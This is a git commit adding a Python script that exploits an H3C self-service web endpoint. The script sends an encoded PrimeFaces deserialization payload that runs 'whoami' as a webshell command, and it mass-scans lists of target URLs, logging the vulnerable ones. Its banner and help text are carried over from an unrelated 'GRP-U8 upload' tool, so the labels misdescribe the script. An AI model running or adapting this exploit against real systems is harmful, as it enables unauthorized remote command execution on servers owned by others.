046c98d67e77a0c589c509601d9e0d17887a4836
mantou-j <15135669655@163.com>
2024-10-11 18:56:10 +0800

    Add files via upload

---
+++ H3C.py
@@ -0,0 +1,64 @@
+import sys
+import requests
+import argparse
+
+
+# 漏洞检测模块
+def checkVuln(url):
+    vulnurl = url + "/mselfservice/javax.faces.resource/dynamiccontent.properties.xhtml"
+    data = """pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami"""  # Webshell
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    try:
+        response = requests.post(vulnurl, headers=headers, data=data, timeout=5, verify=False)
+        if 'system' in response.text:
+            print(f"【+】当前网址存在漏洞：{url}")
+            with open("vuln1.txt", "a+") as f:
+                f.write(url + "\n")
+        else:
+            print("【-】目标网站不存在漏洞...")
+    except Exception as e:
+        print("【-】目标网址存在网络链接问题...")
+
+
+# 批量漏洞检测模块
+def batchCheck(filename):
+    with open(filename, "r") as f:
+        for readline in f.readlines():
+            checkVuln(readline)
+
+
+def banner():
+    bannerinfo = """
+   _  __ ______________  ___  __
+  | |/ // ____/_  __/ / / / |/ /
+  |   // __/   / / / / / /|   / 
+ /   |/ /___  / / / /_/ //   |  
+/_/|_/_____/ /_/  \____//_/|_|  
+
+"""
+    print(bannerinfo)
+    print("YYGRP-U8".center(100, '*'))
+    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
+    print(f"[+]{sys.argv[0]} --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
+    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")
+
+
+# 主程序方法，进行调用
+def main():
+    parser = argparse.ArgumentParser(description='GRP-U8-UploadFile漏洞单批检测脚本@xhonger')
+    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
+    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
+    args = parser.parse_args()
+    if args.url:
+        checkVuln(args.url)
+    elif args.file:
+        batchCheck(args.file)
+    else:
+        banner()
+
+
+if __name__ == '__main__':
+    main()
